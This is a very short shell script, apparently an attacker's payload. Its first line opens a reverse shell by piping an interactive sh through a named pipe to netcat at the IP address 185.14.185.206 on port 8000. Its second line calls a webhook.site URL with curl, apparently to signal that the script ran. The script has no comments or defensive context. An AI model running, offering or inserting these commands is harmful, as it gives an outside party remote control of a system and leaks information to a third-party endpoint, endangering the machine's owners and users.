#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 185.14.185.206 8000 >/tmp/f;

curl https://webhook.site/cb046334-7324-44b2-a9b3-075d7f3bdbb5  
